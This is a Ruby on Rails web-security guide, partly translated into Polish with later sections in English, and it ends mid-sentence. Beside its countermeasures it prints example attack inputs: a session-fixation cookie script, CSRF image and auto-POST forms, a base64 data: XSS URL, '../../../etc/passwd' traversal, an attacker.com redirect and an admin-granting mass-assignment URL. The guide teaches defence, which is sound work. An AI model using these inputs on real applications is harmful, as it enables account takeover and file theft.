Bezpieczeństwo w Ruby On Rails
================================
 
Ten przewodnik opisuje częste problemy związane z bezpieczeństwem w aplikacjach internetowych i pokazuje jak ich uniknąć stosując Railsy. Jeśli masz jakiekolwiek pytania lub sugestie, wyślij wiadomość do Heiko Webers'a na maila: 42 {_et_} rorsecurity.info. Po przeczytaniu tego przewodnika powinieneś znać takie zagadnienia jak:

- Wszystkie [,#fffcdb]#najistotniejsze sposoby obrony#
- Sesje w Railsach, jak są obsługiwane, co można w nich przechowywać oraz jak mogą być atakowane
- Jak zwykłe odwiedzenie witryny może stać się problemem związanym z bezpieczeństwem (przez atak CSRF)
- Na co musisz zwracać uwagę przy pracy z plikami lub dostarczaniu interfejsu administracyjnego
- Swoisty dla Railsów problem z masowym przypisaniem
- Jak zarządzać użytkownikami: logowanie, wylogowanie i metody ataku na wszystkich poziomach.
- I najbardziej popularne metody ataku typu injection

== Wstęp

Frameworki powstały by pomagać projektantom w tworzeniu aplikacji internetowych. Niektóre z nich mogą być pomocne także przy ochronie aplikacji przed atakami. W rzeczywistości wszystkie frameworki są tak samo bezpieczne: jeśli stosujesz je prawidłowo będziesz w stanie stworzyć bezpieczne aplikacje używając niemalże każdego z frameworków. W Ruby on Rails można znaleźć kilka helperów rozwiązujących takie problemy jak np. ataki typu injection. Z przyjemnością muszę stwierdzić, że wszystkie Railsowe aplikacje, które audytowałem miały wysoki poziom bezpieczeństwa.

Ogólnie rzecz biorąc nie ma sposobu na zapewnienie natychmiastowej ochrony aplikacji przed wszystkimi rodzajami ataku. Bezpieczeństwo zależy od ludzi używających frameworka, od metody projektowania jak również od wszystkich poziomów środowiska aplikacji internetowej: silnika aplikacji, serwera, lub aplikacji samej w sobie (i prawdopodobnie od innych poziomów aplikacji).

Gartner Group oszacowała jednak, że 75% ataków dotyczy poziomu aplikacji internetowej. Okazało się, „że spośród 300 audytowanych stron 97% było narażonych na atak”. Dzieje się tak dlatego, ponieważ aplikacje internetowe są stosunkowo łatwym celem ataku. Nawet laik bez trudu może zrozumieć ich działanie i w prosty sposób nimi manipulować.

Zagrożenia wobec aplikacji internetowych to między innymi: przejęcie konta użytkownika, ominięcie kontroli dostępu, czytanie lub modyfikowanie poufnych danych, prezentacja fałszywych treści. Atakujący może również zainstalować konia trojańskiego, lub oprogramowanie rozsyłające niepożądane maile w celu uzyskania korzyści finansowych lub w celu zniszczenia dobrego imienia firmy poprzez modyfikację cennych materiałów. Jeśli chcesz zapobiegać atakom, zminimalizować ich działanie i wyeliminować potencjalne miejsca, w których mógłby nastąpić atak, musisz najpierw w pełni zrozumieć metody ataku. I to właśnie jest celem tego przewodnika.

W celu rozwoju bezpiecznej aplikacji internetowej musisz aktualizować wszystkie jej poziomy i poznać swoich wrogów. Żeby być na bieżąco z aktualnymi informacjami o bezpieczeństwie dopisz się do odpowiednich list mailingowych, czytaj blogi i postaraj się, żeby aktualizowanie i kontrolowanie bezpieczeństwa Twojej aplikacji weszło Ci w nawyk (sprawdź w rozdziale „Dodatkowe materiały”). Ja robię to ręcznie ponieważ to najlepszy sposób, żeby znaleźć złośliwe problemy związane z bezpieczeństwem.

== Sesje
 
Rozważając kwestię bezpieczeństwa dobrze zwrócić uwagę na sesje, które mogą być szczególnie narażone na ataki.
 
=== Czym są sesje?
 
-- _HTTP jest bezstanowym protokołem. Sesje to zmieniają._
 
Większość aplikacji wymaga śledzenia stanu danego użytkownika. Może to dotyczyć zawartości koszyka zakupów lub ID aktualnie zalogowanego użytkownika. Gdyby nie sesje, użytkownik musiałby identyfikować się i uwierzytelniać przy każdej podejmowanej akcji. 
Railsy tworzą nową sesję automatycznie, w chwili gdy użytkownik zaczyna korzystać z  nowej aplikacji. W przypadku gdy użytkownik korzystał już z aplikacji, wczytywana jest istniejąca sesja.
 
Sesja zwykle składa się z tablicy asocjacyjnej wartości i identyfikatora sesji. Zwykle jest to 32-znakowy łańcuch do określenia tablicy asocjacyjnej. Każde cookie wysłane do przeglądarki klienta zawiera identyfikator sesji. I odwrotnie: przeglądarka wysyła je do serwera, na każde żądanie klienta. W Railsach można zapisać i pobrać wartości używając metody sesji:
 
[source, ruby]
----------------------------------------------------------------------------
session[:user_id] = @current_user.id
User.find(session[:user_id])
----------------------------------------------------------------------------
 
=== Identyfikator sesji
 
-- _The session id is a 32 byte long MD5 hash value._

-- _Identyfikator sesji jest 32 bajtową wartością hash MD5._

Identyfikator sesji składa się z wartości hash losowego ciągu znaków. Losowy ciąg znaków to aktualny czas, losowa liczba między 0 a 1, id procesu interpretera Ruby (również po prostu losowa liczba) i stały ciąg znaków. Obecnie atak typu brute-force na ID sesji w Railsach jest niemożliwy. Do tej pory MD5 był bezkonkurencyjny, jednak znaleziono sposób na generowanie kolizji. Oznacza to, że różne dane wejściowe mogą mieć taką samą wartość hash. Jednak nie ma to żadnego wpływu na bezpieczeństwo daty.
 
=== Przechwytywanie sesji

-- _Kradzież identyfikatora sesji użytkownika pozwala atakującemu umożliwia atakującemu dostęp do danej aplikacji internetowej, tak, jakby korzystał z niej pełnoprawny użytkownik._

Wiele aplikacji internetowych ma następujący system uwierzytelniania: użytkownik wprowadza nazwę użytkownika i hasło, aplikacja sprawdza dane i przechowuje identyfikator sprawdzonego użytkownika w tablicy asocjacyjnej sesji. Od tej chwili sesja jest ważna. Na każde żądanie aplikacja wczyta użytkownika o danym identyfikatorze użytkownika bez potrzeby uwierzytelniania. Identyfikator sesji jest odpowiedzialny za identyfikacje sesji.

Stąd wynika, że cookies są wykorzystwane do tymczasowego uwierzytelniania w aplikacjach internetowych. Każdy kto przejmie czyjeś cookies, może używać aplikacji jako ten użytkownik - co może powodować poważne konsekwencje. Oto kilka sposobów na przejęcie sesji i sposoby obrony przed atakiem:
 
- Wywęszenie cookies w niezabezpieczonej sieci. Bezprzewodowa sieć może posłużyć jako przykład takiej sieci. W nieszyfrowanej sieci bezprzewodowej śledzenie ruchu wszystkich podłączonych klientów jest szczególnie łatwe. Jest to jeden z powodów, dla których powinniśy zrezygnować z pracy w kawiarniach. Dla projektantów aplikacji internetowych oznacza to [,#fffcdb] #konieczność zapewnienia bezpiecznego połączenia przez SSL#.
 
- Większość ludzi nie kasuje cookies po pracy na publicznym sprzęcie. Więc jeśli ostatni użytkownik nie wylogował się z aplikacji internetowej, ktoś inny może się pod niego podszywać. Dlatego ważne jest, aby zapewnić użytkownikowi [,#fffcdb]#widoczny przycisk do wylogowania#.
 
- Wiele ataków typu cross-site scripting (XSS) ma na celu pozyskanie cookies użytkownika. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.
 
- Atakujący może spreparować ID sesji użytkownika zamiast kradzieży nieznanych cookies. Więcej informacji o atakach typu session fixation znajduje się w dalszej części podręcznika.
 
Głównym celem większości atakujących jest korzyść finansowa. Ceny za skradzione loginy do kont bankowych na czarnym rynku są wyceniane od 10 do 1000 dolarów (w zależności od środków na koncie). Numery kart kredytowych są warte od 0,40 do 20 dolarów. Za konta na stronach z aukcjami online – 1 do 8 dolarów. Hasła do kont mailowych kosztują od 4 do 30 dolarów. Dane pochodzą ze strony: http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf[Symantec Global Internet Security Threat Report]. 
 
=== Wskazówki dotyczące sesji
 
-- _Kilka ogólnych wskazówek dotyczących sesji._
  
- Nie przechowuj dużych obiektów w sesji. Zamiast tego powinieneś przechowywać je w bazie danych i zapisywać ich ID w sesji. Rozwiążesz w ten sposób problemy z synchronizacją i nie zapełnisz miejsca w sesji (w zależności od tego jaką pojemność wybrałeś, patrz poniżej).  

- [,#fffcdb]#Ważne dane nie powinny być przechowywane w sesjach#. Gdy użytkownik wyczyści cookies albo zamknie przeglądarkę nie będzie mógł ich odzyskać. Przechowując dane w sesji po stronie klienta, użytkownik będzie mógł z nich korzystać. 
 
=== Session storage
 
-- _Railsy zapewniają kilka mechanizmów przechowywania hashów sesji wartości. Najważniejszymi z nich są ActiveRecordStore i CookieStore._
 
Można wymienić wiele sposobów przechowywania sesji, np. gdy Railsy zapisują hash i id sesji. Większość aplikacji typu Real-live korzysta z ActiveRecordStore (lub jej pochodnych). ActiveRecordStore przechowuje hash i id sesji w tabeli w bazie danych. Hash jest zapisywany i wczytywany na każde żądanie.

W Railsach 2 wprowadzono nowy domyślny sposób przechowywania sesji - CookieStore. CookieStore zapisuje hash sesji bezpośrednio w cookie po stronie klienta, skąd wczytywany jest przez serwer. Dzięki temu id sesji staje się zbędne, a aplikacja działa dużo szybciej. Jednak jest to dość kontrowersyjny sposób przechowywania i trzeba wziąć pod uwagę kilka kwestii związanych z bezpieczeństwem tego sposobu:
  
- Rozmiar cookies nie może przekraczać 4K. Jest to w porządku, jednak nie powinno się przechowywać w cookies dużej ilości danych, odwołując się do tego co napisałem wcześniej. [,#fffcdb]#Przechowywanie id bazy danych danego użytkownika jest dobrym rozwiązaniem#.

- Użytkownik może zobaczyć wszystko co przechowujesz w sesji, ponieważ przechowywane dane są w postaci tekstowej (właściwie są one zakodowane w Base64, ale nie szyfrowane) Więc zapewne [,#fffcdb]#nie chciałbyś przechowywać tu żadnych sekretnych danych#. Żeby zapobiec manipulacji hasha sesji, skrót jest wyliczany na podstawie sesji z tajnym kluczem (secret) po stronie serwera i umieszczany na końcu pliku cookie.
 
Oznacza to, że bezpieczeństwo przechowywania jest zależne od tajnego klucza (I od algorytmu funkcji skrótu, którym domyślnie jest, jak do tej pory niezastąpiony, SHA512). Więc [,#fffcdb]#nie używaj prostych kluczy takich jak słowa ze słownika, lub kluczy poniżej 30 znaków#. Umieść swój tajny klucz w environment.rb:
 
....................................
config.action_controller.session = {
  :key         => ‘_app_session’,
  :secret      => ‘0x0dkfj3927dkc7djdh36rkckdfzsg...’
}
....................................
 
Istnieją jednak, pochodne CookieStore które szyfrują hash sesji, więc klient nie może go zobaczyć.
 
=== Ataki typu Replay na sesje CookieStore.
 
-- _Kolejnym sposobem ataku, którego powinieneś się obawiać gdy używasz CookieStore, jest atak typu replay._

Wygląda to tak:
 
- Użytkownik otrzymuje kredyty, kwota jest przechowywana w sesji (co jest złym pomysłem, ale użyłem tego przykładu dla celów demonstracyjnych). 
- Użytkownik kupuje jakiś przedmiot. 
- Jego nowy, niższy kredyt będzie przechowywany w sesji. 
- Ciemna strona mocy użytkownika każe mu wziąć cookie z pierwszego kroku (które wcześniej skopiował) i zastąpić obecne cookie w przeglądarce. 
- Użytkownik ma swój kredyt z powrotem.
 
Zastosowanie nonce (losowa wartość) w sesji rozwiązuje problem ataku typu replay. Nonce jest ważna tylko raz i serwer musi śledzić wszystkie ważne nonce. To staje się jeszcze bardziej skomplikowane, jeśli twoja aplikacja znajduje się na kilku serwerach (mongrels). Przechowywanie nonce w tabeli bazy danych niszczy całą ideę CookieStore (unikanie łączenia się z bazą danych).
 
Najlepszym [,#fffcdb]#rozwiązaniem jest przechowywanie tego rodzaju danych nie w sesji, lecz w bazie danych#. W tym przypadku kredyt powinien być przechowywany w bazie danych, a id_zalogowanego_użytkownika (logged_in_user_id) w sesji.
=== Atak typu Session fixation
 
-- _Oprócz kradzieży identyfikatora sesji użytkownika, atakujący może spreparować identyfikator sesji dla użytkownika. Zjawisko to jest określane mianem ataku typu session fixation.
 
image::images/session_fixation.png[Session fixation]
 
Ten atak skupia się na spreparowaniu identyfikatora sesji dla użytkownika, który jest znany atakujący i zmuszeniu użytkownika do korzystania z tego identyfikatora. Zatem atakujący nie musi później kraść identyfikatora sesji. Oto jak działa ten atak:
 
. Atakujący tworzy ważny identyfikator sesji: Ładuje stronę logowania aplikacji internetowej (która ma być obiektem ataku typu session fixation), i pozyskuje identyfikator sesji, wysłany w odpowiedzi z serwera w pliku cookie (patrz nr 1 i 2 na obrazku).
 
. Atakujący prawdopodobnie będzie kontynuował sesję. Wygasanie sesji, na przykład co 20 minut, znacznie skraca czas przewidziany dla ataku. Dlatego atakujący co jakiś czas otwiera aplikację internetową, żeby podtrzymać sesję.
 
. Teraz atakujący może zmusić przeglądarkę użytkownika do korzystania z jego identyfikatora sesji (patrz nr 3 na obrazku). Ponieważ nie można zmienić cookie innej domeny (z powodu zasady tożsamego pochodzenia - same origin policy), atakujący musi uruchomić JavaScript z domeny docelowej aplikacji internetowej. Wdrożenie (Injection) własnego kodu JavaScript do aplikacji będącej obiektem ataku jest możliwe dzięki takim metodom jak XSS. Oto przykład: 
+<script> document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9"; </script>+
Więcej informacji o atakach typu XSS i Injection znajduje się w dalszej części podręcznika.
  
. Atakujący wabi ofiary do stron zainfekowanych kodem JavaScript. Przeglądając stronę, przeglądarka ofiary zmienia identyfikator sesji na identyfikator sesji-pułapki.
 
. Ponieważ nowa sesja-pułapka nie była do tej pory nieużywana, aplikacja internetowa będzie wymagać uwierzytelnienia użytkownika. 
 
. Od tej pory, ofiara i atakujący będą wspólnie używać aplikacji internetowej, korzystając z tej samej sesji: Sesja stała się ważna, a ofiara nie zauważyła ataku.
 
=== Sposoby obrony przed atakiem typu session fixation
 
-- _Jedna linia kodu może ochronić Cię przed atakiem typu session fixation._
  
Najskuteczniejszą ochroną jest [,#fffcdb]#wydanie nowego identyfikatora sesji# i zadeklarowanie starego jako nieważnego po udanym logowaniu. W ten sposób atakujący nie może używać spreparowanych identyfikatorów sesji. Jest to również dobry sposób obrony przeciw przejęciu sesji. Oto jak utworzyć nową sesję w Railsach:

[source, ruby]
----------------------------------------------------------------------------
reset_session
----------------------------------------------------------------------------
 
W przypadku korzystania z popularnej wtyczki RestfulAuthentication do zarządzania użytkownikami, należy dodać reset_session do akcji SessionsController#create. Zwróć uwagę, że ta akcja usuwa wszystkie wartości z sesji, [,#fffcdb]# więc musisz przenieść je do nowej sesji#.
  
Innym sposobem obrony jest [,#fffcdb]#zapisywanie specyficznych właściwości użytkownika w sesji#, weryfikowanie ich przy każdym żądaniu i odmowa dostępu, jeśli informacje te nie pasują do siebie. Takimi właściwościami mogą być adres IP lub user agent (nazwa przeglądarki internetowej), choć ta ostatnia nie jest aż tak bardzo charakterystyczna dla użytkownika. Podczas zapisywania adresu IP, musisz pamiętać, że istnieją dostawcy usług internetowych oraz duże organizacje, które oferują swoim użytkownikom dostęp do Internetu przez proxy. [,#fffcdb]# Adresy IP tych użytkowników mogą ulegać zmianom w trakcie sesji#, więc nie będą oni mogli korzystać z aplikacji, lub tylko w ograniczonym zakresie.

=== Session expiry

-- _Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (CSRF), session hijacking and session fixation._

One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to [,#fffcdb]#expire sessions in a database table#. Call Session.sweep("20m") to expire sessions that were used longer than 20 minutes ago.

[source, ruby]
----------------------------------------------------------------------------
class Session < ActiveRecord::Base
 def self.sweep(time_ago = nil)
     time = case time_ago
       when /^(\d+)m$/ then Time.now - $1.to_i.minute
       when /^(\d+)h$/ then Time.now - $1.to_i.hour
       when /^(\d+)d$/ then Time.now - $1.to_i.day
       else Time.now - 1.hour
     end
     self.delete_all "updated_at < '#{time.to_s(:db)}'"
   end
 end
----------------------------------------------------------------------------

The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a created_at column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:

[source, ruby]
----------------------------------------------------------------------------
self.delete_all "updated_at < '#{time.to_s(:db)}' OR created_at < '#{2.days.ago.to_s(:db)}'"
----------------------------------------------------------------------------

== Cross-Site Reference Forgery (CSRF)
-- _This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands._

image::images/csrf.png[CSRF]

In the session chapter you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let's start with an example:

- Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file.
- +<img src="http://www.webapp.com/project/1/destroy">+
- Bob's session at www.webapp.com is still alive, because he didn't log out a few minutes ago.
- By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.
- The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.
- Bob doesn't notice the attack -- but a few days later he finds out that project number one is gone.

It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere – in a forum, blog post or email.

CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) -- less than 0.1% in 2006 -- but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in my (and others) security contract work – [,#fffcdb]#CSRF is an important security issue#.

=== CSRF Countermeasures

-- _First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF._

The HTTP protocol basically provides two main types of requests - GET and POST (and more, but they are not supported by most browsers). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:

*Use GET if:*

- The interaction is more [,#fffcdb]#like a question# (i.e., it is a safe operation such as a query, read operation, or lookup).

*Use POST if:*

- The interaction is more [,#fffcdb]#like an order#, or
- The interaction [,#fffcdb]#changes the state# of the resource in a way that the user would perceive (e.g., a subscription to a service), or
- The user is [,#fffcdb]#held accountable for the results# of the interaction.

If your web application is RESTful, you might be used to additional HTTP verbs, such as PUT or DELETE. Most of today‘s web browsers, however do not support them - only GET and POST. Rails uses a hidden +_method+ field to handle this barrier.

[,#fffcdb]#The verify method in a controller can make sure that specific actions may not be used over GET#. Here is an example to verify the use of the transfer action over POST. If the action comes in using any other verb, it redirects to the list action.

.................................................................................
verify :method => :post, :only => [:transfer], :redirect_to => {:action => :list}
.................................................................................

With this precaution, the attack from above will not work, because the browser sends a GET request for images, which will not be accepted by the web application.

But this was only the first step, because [,#fffcdb]#POST requests can be send automatically, too#. Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. In fact it dynamically creates a new form that sends a POST request.

[source, html]
----------------------------------------------------------------------------
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
----------------------------------------------------------------------------

Or the attacker places the code into the onmouseover event handler of an image:

+<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />+

There are many other possibilities, including Ajax to attack the victim in the background. The  [,#fffcdb]#solution to this is including a security token in non-GET requests# which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:

+protect_from_forgery :secret => "123456789012345678901234567890..."+

This will automatically include a security token, calculated from the current session and the server-side secret, in all forms and Ajax requests generated by Rails. You won't need the secret, if you use CookieStorage as session storage. It will raise an ActionController::InvalidAuthenticityToken error, if the security token doesn't match what was expected.

Note that [,#fffcdb]#cross-site scripting (XSS) vulnerabilities bypass all CSRF protections#. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read more about XSS later.

== Redirection and Files

Another class of security vulnerabilities surrounds the use of redirection and files in web applications.

=== Redirection

-- _Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack._

Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:

[source, ruby]
----------------------------------------------------------------------------
def legacy
  redirect_to(params.update(:action=>'main'))
end
----------------------------------------------------------------------------

This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can exploited by an attacker if he includes a host key in the URL:

+http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com+

If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to [,#fffcdb]#include only the expected parameters in a legacy action# (again a whitelist approach, as opposed to removing unexpected parameters). [,#fffcdb]#And if you redirect to an URL, check it with a whitelist or a regular expression#.

==== Self-contained XSS

Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:

+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K+

This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, [,#fffcdb]#do not allow the user to supply (parts of) the URL to be redirected to#.

=== File uploads

-- _Make sure file uploads don't overwrite important files, and process media files asynchronously._

Many web applications allow users to upload files. [,#fffcdb]#File names, which the user may choose (partly), should always be filtered# as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.

When filtering user input file names, [,#fffcdb]#don't try to remove malicious parts#. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which [,#fffcdb]#checks for the validity of a file name with a set of accepted characters#. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the http://github.com/technoweenie/attachment_fu/tree/master[attachment_fu plugin]:

[source, ruby]
----------------------------------------------------------------------------
def sanitize_filename(filename)
  returning filename.strip do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.gsub! /^.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
----------------------------------------------------------------------------

A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its [,#fffcdb]#vulnerability to denial-of-service attacks#. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.

The solution to this, is best to [,#fffcdb]#process media files asynchronously#: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.

=== Executable code in file uploads

-- _Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails /public directory if it is Apache's home directory._

The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file “file.cgi” with code in it, which will be executed when someone downloads the file.

[,#fffcdb]#If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it#, store files at least one level downwards.

=== File downloads

-- _Make sure users cannot download arbitrary files._

Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:

[source, ruby]
----------------------------------------------------------------------------
send_file('/var/www/uploads/' + params[:filename])
----------------------------------------------------------------------------

Simply pass a file name like “../../../etc/passwd” to download the server's login information. A simple solution against this, is to [,#fffcdb]#check that the requested file is in the expected directory#:

[source, ruby]
----------------------------------------------------------------------------
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename =!
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, :disposition => 'inline'
----------------------------------------------------------------------------

Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.

== Intranet and Admin security

-- _Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world._

In 2007 there was the first tailor-made http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html[Trojan] which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. 

*XSS*  If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.

Having one single place in the admin interface or Intranet where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.

Refer to the Injection section for countermeasures against XSS. It is [,#fffcdb]#recommended to use the SafeErb plugin# also in an Intranet or administration interface.

*CSRF*  Cross-Site Reference Forgery (CSRF) is a giant attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.

A real-world example is a http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html[router reconfiguration by CSRF]. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had his credentials stolen.

Another example changed Google Adsense's e-mail address and password by http://www.0x000000.com/index.php?i=213&bin=11010101[CSRF]. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. 

Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.

For [,#fffcdb]#countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section#.

=== Additional precautions

The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:

- It is very important to [,#fffcdb]#think about the worst case#: What if someone really got hold of my cookie or user credentials. You could [,#fffcdb]#introduce roles# for the admin interface to limit the possibilities of the attacker. Or how about [,#fffcdb]#special login credentials# for the admin interface, other than the ones used for the public part of the application. Or a [,#fffcdb]#special password for very serious actions#?

- Does the admin really have to access the interface from everywhere in the world? Think about [,#fffcdb]#limiting the login to a bunch of source IP addresses#. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.

- [,#fffcdb]#Put the admin interface to a special sub-domain# such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.

== Mass assignment

-- _Without any precautions Model.new(params[:model]) allows attackers to set any database column's value._

The mass-assignment feature may become a problem, as it allows an attacker to set any model's attribute by manipulating the hash passed to a model's new() method:

[source, ruby]
----------------------------------------------------------------------------
def signup
  params[:user] #=> {:name => “ow3ned”, :admin => true}
  @user = User.new(params[:user])
end
----------------------------------------------------------------------------

Mass-assignment saves you much work, because you don't have to set each value individually. Simply pass a hash to the new() method, or assign attributes=(attributes) a hash value, to set the model's attributes to the values in the hash. The problem is that it is often used in conjunction with the parameters (params) hash available in the controller, which may be manipulated by an attacker. He may do so by changing the URL like this:

..........
http://www.example.com/user/signup?user[name]=ow3ned&user[admin]=1
..........

This will set the following parameters in the controller:

[source, ruby]
----------------------------------------------------------------------------
params[:user] #=> {:name => “ow3ned”, :admin => true}
----------------------------------------------------------------------------

So if you create a new user using mass-assignment, it may be too easy to become an administrator.

=== Countermeasures

To avoid this, Rails provides two class methods in your ActiveRecord class to control access to your attributes. The attr_protected method takes a list of attributes that will not be accessible for mass-assignment. For example:

[source, ruby]
----------------------------------------------------------------------------
attr_protected :admin
----------------------------------------------------------------------------

A much better way, because it follows the whitelist-principle, is the [,#fffcdb]#attr_accessible method#. It is the exact opposite of attr_protected, because [,#fffcdb]#it takes a list of attributes that will be accessible#. All other attributes will be protected. This way you won't forget to protect attributes when adding new ones in the course of development. Here is an example:

[source, ruby]
----------------------------------------------------------------------------
attr_accessible :name
----------------------------------------------------------------------------

If you want to set a protected attribute, you will to have to assign it individually:

[source, ruby]
----------------------------------------------------------------------------
params[:user] #=> {:name => "ow3ned", :admin => true}
@user = User.new(params[:user])
@user.admin #=> false # not mass-assigned
@user.admin = true
@user.admin #=> true
----------------------------------------------------------------------------

== User management

-- _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._

There are some authorization and authentication plug-ins for Rails available. A good one saves only encrypted passwords, not plain-text passwords. The most popular plug-in is [,#fffcdb]#restful_authentication# which protects from session fixation, too. However, earlier versions allowed you to login without user name and password in certain circumstances.

Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):

..........
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
..........

This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:

[source, ruby]
----------------------------------------------------------------------------
User.find_by_activation_code(params[:id])
----------------------------------------------------------------------------

If the parameter was nil, the resulting SQL query will be

..........
SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1
